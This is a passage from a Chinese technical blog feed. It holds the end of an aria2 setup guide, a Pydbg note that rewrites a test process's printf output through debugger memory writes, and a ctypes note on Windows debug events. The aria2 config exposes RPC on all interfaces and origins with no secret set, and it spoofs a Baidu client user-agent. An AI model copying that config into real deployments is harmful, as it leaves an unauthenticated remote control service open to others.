class="line"><span class="meta">#</span><span class="bash"> 从会话文件中读取下载任务</span></span><br><span class="line">input-file=/etc/aria2/aria2.session</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在Aria2退出时保存`错误/未完成`的下载任务到会话文件</span></span><br><span class="line">save-session=/etc/aria2/aria2.session</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span></span><br><span class="line">save-session-interval=30</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 断点续传</span></span><br><span class="line">continue=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span></span><br><span class="line"><span class="meta">#</span><span class="bash">disk-cache=32M</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> falloc和trunc则需要文件系统和内核支持</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项</span></span><br><span class="line">file-allocation=none</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端伪装</span></span><br><span class="line">user-agent=netdisk;5.2.6;PC;PC-Windows;6.2.9200;WindowsBaiduYunGuanJia</span><br><span class="line">referer=http://pan.baidu.com/disk/home</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用IPv6, 默认:<span class="literal">false</span></span></span><br><span class="line">disable-ipv6=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 其他</span></span><br><span class="line">always-resume=true</span><br><span class="line">check-integrity=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 下载位置 ## ============================================================</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最大同时下载任务数, 运行时可修改, 默认:5</span></span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同一服务器连接数, 添加时可指定, 默认:1</span></span><br><span class="line">max-connection-per-server=16</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务最大线程数, 添加时可指定, 默认:5</span></span><br><span class="line">split=64</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整体下载速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-overall-download-limit=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务下载速度限制, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-download-limit=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整体上传速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-overall-upload-limit=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务上传速度限制, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-upload-limit=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># RPC设置 ## ============================================================</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用RPC, 默认:<span class="literal">false</span></span></span><br><span class="line">enable-rpc=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许所有来源, 默认:<span class="literal">false</span></span></span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许非外部访问, 默认:<span class="literal">false</span></span></span><br><span class="line">rpc-listen-all=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span></span><br><span class="line"><span class="meta">#</span><span class="bash">event-poll=select</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC监听端口, 端口被占用时可以修改, 默认:6800</span></span><br><span class="line">rpc-listen-port=6800</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-secret=&lt;TOKEN&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否启用 RPC 服务的 SSL/TLS 加密,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-secure=<span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-certificate=/path/to/certificate.pem</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-private-key=/path/to/certificate.key</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># BT/PT下载相关 ## ============================================================</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">follow-torrent=<span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span></span><br><span class="line">listen-port=51413</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个种子最大连接数, 默认:55</span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-max-peers=55</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开DHT功能, PT需要禁用, 默认:<span class="literal">true</span></span></span><br><span class="line">enable-dht=false</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开IPv6 DHT功能, PT需要禁用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">enable</span>-dht6=<span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> DHT网络监听端口, 默认:6881-6999</span></span><br><span class="line"><span class="meta">#</span><span class="bash">dht-listen-port=6881-6999</span></span><br><span class="line"></span><br><span class="line">dht-file-path=/opt/var/aria2/dht.dat</span><br><span class="line">dht-file-path6=/opt/var/aria2/dht6.dat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本地节点查找, PT需要禁用, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-enable-lpd=<span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 种子交换, PT需要禁用, 默认:<span class="literal">true</span></span></span><br><span class="line">enable-peer-exchange=false</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 每个种子限速, 对少种的PT很有用, 默认:50K</span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-request-peer-speed-limit=50K</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置 peer id 前缀</span></span><br><span class="line">peer-id-prefix=-TR2770-</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span></span><br><span class="line">seed-ratio=0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制保存会话, 即使任务已经完成, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 较新的版本开启后会在任务完成后依然保留.aria2文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">force-save=<span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> BT校验相关, 默认:<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-hash-check-seed=<span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 继续之前的BT任务时, 无需再次校验, 默认:<span class="literal">false</span></span></span><br><span class="line">bt-seed-unverified=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存磁力链接元数据为种子文件(.torrent文件), 默认:<span class="literal">false</span></span></span><br><span class="line">bt-save-metadata=true</span><br><span class="line"></span><br><span class="line">bt-max-open-files=16</span><br></pre></td></tr></table></figure><h2 id="0x02-服务开机启动"><a class="header-anchor" href="#0x02-服务开机启动"></a>0x02 服务开机启动</h2><p>首先测试配置文件能否正常启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c --conf-path=/etc/aria2/aria2.conf</span><br></pre></td></tr></table></figure><p>无报错说明配置成功。</p><h3 id="增加开机启动脚本"><a class="header-anchor" href="#增加开机启动脚本"></a>增加开机启动脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/init.d/aria2c</span><br></pre></td></tr></table></figure><p>添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: aria2</span></span><br><span class="line"><span class="comment"># Required-Start: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: Aria2 Downloader</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已开启Aria2c"</span></span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已关闭Aria2c"</span></span><br><span class="line"> killall aria2c</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line"> </span><br><span class="line"> killall aria2c</span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>修改文件权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 /etc/init.d/aria2</span><br></pre></td></tr></table></figure><p>添加ariac服务到开机启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d aria2c defaults</span><br></pre></td></tr></table></figure><p>启动服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service aria2c start</span><br></pre></td></tr></table></figure><p>查看服务状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status aria2c</span><br></pre></td></tr></table></figure><h2 id="0x03-安装Camtd"><a class="header-anchor" href="#0x03-安装Camtd"></a>0x03 安装Camtd</h2><p>在<code>Camtd</code>的<a href="https://github.com/jae-jae/Camtd/releases" target="_blank" rel="noopener">releases页面</a>下载最新插件，然后拖入<code>chrome</code>安装即可。</p><p>安装完成后如图：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20200219200725497.png" alt="image-20200219200725497.png"></p><p>如果aria2c服务没有启动，界面右下角会提示未连接，重启服务即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service aria2c restart</span><br></pre></td></tr></table></figure><p>下载速度还是挺快的：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20200219201247042.png" alt="image-20200219201247042.png"></p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> kali </tag>
            
            <tag> Aria2c </tag>
            
            <tag> Camtd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pydbg学习笔记一	——调试器基础使用</title>
      <link href="/p/442dd6de.html"/>
      <url>/p/442dd6de.html</url>
      
        <content type="html"><![CDATA[<h1>Pydbg学习笔记一——调试器基础使用</h1><p>前面<code>Ctypes</code>系列的笔记其实出来第一篇以外都应该算是<code>Pydbg</code>模块的一部分，通过对win32进程管理相关API的学习，我们实现了包括断点、读写内存数据、进程控制、附加调试等一系列的功能。</p><p><code>Pydbg</code>库是在上面基础上的封装，有更完善更强大的功能。</p><a id="more"></a><hr><h2 id="安装Pydbg库"><a class="header-anchor" href="#安装Pydbg库"></a>安装Pydbg库</h2><p>由于Pydbg库只支持到python2版本，并且现在已经停止支持了，所以一下的实验只能基于python2来做（注意从头到尾无论是python还是被调试的二进制程序都是32位的）。</p><p>在查找资料的时候，我也在<code>github</code>上发现了基于<code>python3</code>的<code>pydbg</code>版本。亲测可以安装成功，但是<code>Pydbg</code>所依赖的<code>pydasm</code>库（也是仅支持到python2.x），在我的电脑上一直没有编译成功，所以只能在python2下完成剩下的工作了。</p><p><strong>安装步骤：</strong></p><p><code>pydbg</code>依赖<code>pydasm</code>和<code>paimei</code>这两个库，安装步骤比较繁琐，这里找到了一个方便的第三方封装版本，一键安装即可。</p><p>首先在<a href="https://github.com/reider-roque/pydbg-pydasm-paimei/blob/master/pydbg-pydasm-paimei.zip" target="_blank" rel="noopener">这里</a>下载源码压缩包：</p><p>解压缩后进入<code>pydbg-pydasm-paimei</code>目录并运行<code>python setup.py install</code>即可编译安装成功。</p><p>安装有问题请访问原仓库<code>READEME</code>。</p><p><code>pydbg</code>库的使用方法与之前自己实现的调试代码基本一样。</p><hr><h2 id="捕获断点后的事件处理函数"><a class="header-anchor" href="#捕获断点后的事件处理函数"></a>捕获断点后的事件处理函数</h2><p><code>PyDbg </code>中设置函数的断点原型如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp_set(address, description=<span class="string">""</span>, restore=<span class="literal">True</span>, handler=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p><code>address</code>：断点的地址。</p><p><code>description</code> ：可选参数，用来给每个断点设置唯一的名字。</p><p><code>restore</code>：决定了是否要在断点被触发以后重新设置。</p><p><code>handler</code>：指向断点触发时候调用的回调函数。断点回调函数只接收一个参数，就是<code>pydbg()</code>类的实例化对象。所有的上下文数据，线程，进程信息都在回调函数被调用的时候，装填在这个类中。</p><p>还是以<code>printf_loop.py</code>作为被调试对象，通过我们自定义的回调函数，试试修改模块中<code>printf()</code>的打印值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># printf_loop.py</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">msvcrt = cdll.msvcrt</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msvcrt.printf(<span class="string">b"Hello %d\n"</span> % counter)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    counter += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可知<code>printf()</code>函数只接收了一个参数，那么当我们在<code>printf()</code>函数入口下断点之后，<code>esp + 0x4</code>中的地址中存放的值就是输入的<code>Hello %d\n</code>。（注意这里<code>esp+4</code>是栈空间在内存中的位置，其值为<code>parameter1</code>的地址）</p><p>首先用<code>x32dbg</code>附加对应模块调试，验证我们的猜想：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20200110205356638.png" alt="image-20200110205356638.png"></p><p>接下来运行我们的脚本，强行修改内存，改变程序的输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my_test.py</span></span><br><span class="line"><span class="keyword">from</span> pydbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pydbg.defines <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is our user defined callback function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf_randomizer</span><span class="params">(dbg)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Read in the value of the counter at ESP + 0x4 as a DWORD</span></span><br><span class="line">    parameter_addr = dbg.context.Esp + <span class="number">0x4</span></span><br><span class="line">    <span class="comment"># 读取参数在栈空间中的地址（注意返回值是str）</span></span><br><span class="line">    parameter_stack_addr = dbg.read_process_memory(parameter_addr,<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 读取栈空间中的参数(counter的值)，注意要有一步将str转为int的步骤</span></span><br><span class="line">    counter = dbg.read_process_memory(struct.unpack(<span class="string">"L"</span>,parameter_stack_addr)[<span class="number">0</span>],<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># When using read_process_memory, it returns a packed binary</span></span><br><span class="line">    <span class="comment"># string, we must first unpack it before we can use it further</span></span><br><span class="line">    <span class="comment"># counter = struct.unpack("L",counter)[0]</span></span><br><span class="line">    <span class="comment"># 这里其实不用unpack也可以</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Counter: %s"</span> % counter</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Generate a random number and pack it into binary format</span></span><br><span class="line">    <span class="comment"># so that it is written correctly back into the process</span></span><br><span class="line">    <span class="comment"># 生成我们要替换的字符串</span></span><br><span class="line">    random_counter = <span class="string">"World %d\n"</span> %random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">    <span class="comment"># random_counter = struct.pack("L",random_counter)[0]</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Now swap in our random number and resume the process</span></span><br><span class="line">    dbg.write_process_memory(struct.unpack(<span class="string">"L"</span>,parameter_stack_addr)[<span class="number">0</span>],random_counter)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> DBG_CONTINUE</span><br><span class="line"></span><br><span class="line"><span class="comment"># Instantiate the pydbg class</span></span><br><span class="line">dbg = pydbg()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now enter the PID of the printf_loop.py process</span></span><br><span class="line">pid = raw_input(<span class="string">"Enter the printf_loop.py PID: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach the debugger to that process</span></span><br><span class="line">dbg.attach(int(pid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the breakpoint with the printf_randomizer function</span></span><br><span class="line"><span class="comment"># defined as a callback</span></span><br><span class="line">printf_address = dbg.func_resolve(<span class="string">"msvcrt"</span>,<span class="string">"printf"</span>)</span><br><span class="line">dbg.bp_set(printf_address,description=<span class="string">"printf_address"</span>,handler=printf_randomizer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resume the process</span></span><br><span class="line">dbg.run()</span><br></pre></td></tr></table></figure><p>运行效果：</p><table><thead><tr><th style="text-align:left">printf_loop.py</th><th style="text-align:left">my_test.py</th></tr></thead><tbody><tr><td style="text-align:left">Hello 0                      <br>Hello 1                      <br>Hello 2                      <br>Hello 3                      <br>Hello 4                      <br>Hello 5                      <br>Hello 6<br>Hello 7<br>World 42<br>World 47<br>World 34<br>World 66<br>World 13<br>World 30<br>World 78<br>World 46<br>World 70<br>World 97<br></td><td style="text-align:left">Enter the printf_loop.py PID: 15620<br>Counter: Hello 8<br>Counter: Hello 9<br>Counter: Hello 10<br>Counter: Hello 11<br>Counter: Hello 12<br>Counter: Hello 13<br>Counter: Hello 14<br>Counter: Hello 15<br>Counter: Hello 16<br>Counter: Hello 17<br>Counter: Hello 18<br>Counter: Hello 19<br>Counter: Hello 20<br>Counter: Hello 21<br>Counter: Hello 22<br>Counter: Hello 23<br>Counter: Hello 24</td></tr></tbody></table><p>很明显当数字加到8的时候，我们的修改操作起了作用，我们在被调试程序内部修改了输出的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pydbg </tag>
            
            <tag> python </tag>
            
            <tag> 调试器 </tag>
            
            <tag> ctypes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctypes学习笔记三——断点</title>
      <link href="/p/780073ef.html"/>
      <url>/p/780073ef.html</url>
      
        <content type="html"><![CDATA[<h1>ctypes学习笔记三——断点</h1><h2 id="捕获调试事件"><a class="header-anchor" href="#捕获调试事件"></a>捕获调试事件</h2><p>前面实现了获取CPU寄存器状态的方法，接下来可以继续对进程调试事件进行处理。</p><p>首先进入进程，然后等待并获取调试事件，用到的API如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WaitForDebugEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDEBUG_EVENT lpDebugEvent,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD         dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>这个函数一般是调试器主循环的组成部分。</strong></p><p>调试事件信息定义在一个结构体里面：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DEBUG_EVENT</span> &#123;</span> </span><br><span class="line">    DWORD dwDebugEventCode; </span><br><span class="line">    DWORD dwProcessId; </span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        EXCEPTION_DEBUG_INFO Exception; </span><br><span class="line">        CREATE_THREAD_DEBUG_INFO CreateThread; </span><br><span class="line">        CREATE_PROCESS_DEBUG_INFO CreateProcessInfo; </span><br><span class="line">        EXIT_THREAD_DEBUG_INFO ExitThread; </span><br><span class="line">        EXIT_PROCESS_DEBUG_INFO ExitProcess; </span><br><span class="line">        LOAD_DLL_DEBUG_INFO LoadDll;</span><br><span class="line">        UNLOAD_DLL_DEBUG_INFO UnloadDll; </span><br><span class="line">        OUTPUT_DEBUG_STRING_INFO DebugString; </span><br><span class="line">        RIP_INFO RipInfo;</span><br><span class="line">    &#125;u;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，<code>dwDebugEventCode</code>值反映了被捕获的事件类型。</p><a id="more"></a><p><code>dwDebugEventCode</code>值的定义如下:</p><table><thead><tr><th style="text-align:center">Value</th><th style="text-align:center">Meaning</th></tr></thead><tbody><tr><td style="text-align:center"><strong>CREATE_PROCESS_DEBUG_EVENT</strong><br>3</td><td style="text-align:center">报告创建过程调试事件。<strong>u.CreateProcessInfo</strong>的值指定一个<a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-create_process_debug_info" target="_blank" rel="noopener">CREATE_PROCESS_DEBUG_INFO</a> 结构。</td></tr><tr><td style="text-align:center"><strong>CREATE_THREAD_DEBUG_EVENT</strong><br>2</td><td style="text-align:center">报告创建线程调试事件。<strong>u.CreateThread</strong>的值指定<a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-create_thread_debug_info" target="_blank" rel="noopener">CREATE_THREAD_DEBUG_INFO</a> 结构。</td></tr><tr><td style="text-align:center"><strong>EXCEPTION_DEBUG_EVENT</strong><br>1</td><td style="text-align:center">报告异常调试事件。<strong>u.Exception</strong>的值指定 <a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-exception_debug_info" target="_blank" rel="noopener">EXCEPTION_DEBUG_INFO</a>结构。</td></tr><tr><td style="text-align:center"><strong>EXIT_PROCESS_DEBUG_EVENT</strong><br>5</td><td style="text-align:center">报告退出进程调试事件。<strong>u.ExitProcess</strong>的值指定一个<a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-exit_process_debug_info" target="_blank" rel="noopener">EXIT_PROCESS_DEBUG_INFO</a> 结构。</td></tr><tr><td style="text-align:center"><strong>EXIT_THREAD_DEBUG_EVENT</strong><br>4</td><td style="text-align:center">报告退出线程调试事件。<strong>u.ExitThread</strong>的值指定一个 <a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-exit_thread_debug_info" target="_blank" rel="noopener">EXIT_THREAD_DEBUG_INFO</a>结构。</td></tr><tr><td style="text-align:center"><strong>LOAD_DLL_DEBUG_EVENT</strong><br>6</td><td style="text-align:center">报告加载动态链接库（DLL）调试事件。<strong>u.LoadDll</strong>的值 指定 <a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-load_dll_debug_info" target="_blank" rel="noopener">LOAD_DLL_DEBUG_INFO</a>结构。</td></tr><tr><td style="text-align:center"><strong>OUTPUT_DEBUG_STRING_EVENT</strong><br>8</td><td style="text-align:center">报告输出调试字符串调试事件。<strong>u.DebugString</strong>的值 指定<a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-output_debug_string_info" target="_blank" rel="noopener">OUTPUT_DEBUG_STRING_INFO</a> 结构。</td></tr><tr><td style="text-align:center"><strong>RIP_EVENT</strong><br>9</td><td style="text-align:center">报告RIP调试事件（系统调试错误）。<strong>u.RipInfo</strong>的值 指定<a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-rip_info" target="_blank" rel="noopener">RIP_INFO</a>结构。</td></tr><tr><td style="text-align:center"><strong>UNLOAD_DLL_DEBUG_EVENT</strong><br>7</td><td style="text-align:center">报告一个卸载DLL调试事件。<strong>u.UnloadDll</strong>的值指定一个 <a href="https://docs.microsoft.com/windows/desktop/api/minwinbase/ns-minwinbase-unload_dll_debug_info" target="_blank" 